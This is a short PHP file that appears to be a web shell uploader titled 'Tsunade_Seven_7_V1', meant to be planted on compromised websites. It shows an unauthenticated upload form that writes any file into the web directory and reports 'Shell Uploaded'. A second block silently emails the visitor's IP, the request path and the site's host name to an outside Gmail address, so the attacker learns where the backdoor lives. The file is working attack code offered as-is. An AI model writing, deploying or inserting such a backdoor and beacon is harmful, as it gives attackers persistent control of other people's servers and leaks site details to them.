<?php
echo '<html><head><title>Tsunade_Seven_7_V1</title>
</head>';
echo 'Tsunade_Seven_7_V1<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Shell Uploaded ! :)<b><br><br>'; }
else { echo '<b>Not uploaded ! </b><br><br><html>'; }
}
?>
<?php
$ip = getenv("REMOTE_ADDR");
$ra44 = rand(1, 99999);
$subj98 = " Bot v6 Rzlt |$ip";
$email = "buatnuyulea@gmail.com";
$from = "From: Result<botv3@mrspybotv3.com";
$a45 = $_SERVER['REQUEST_URI'];
$b75 = $_SERVER['HTTP_HOST'];
$m22 = $ip . "";
$msg8873 = "$a45 $b75 $m22";
mail($email, $subj98, $msg8873, $from);
?>
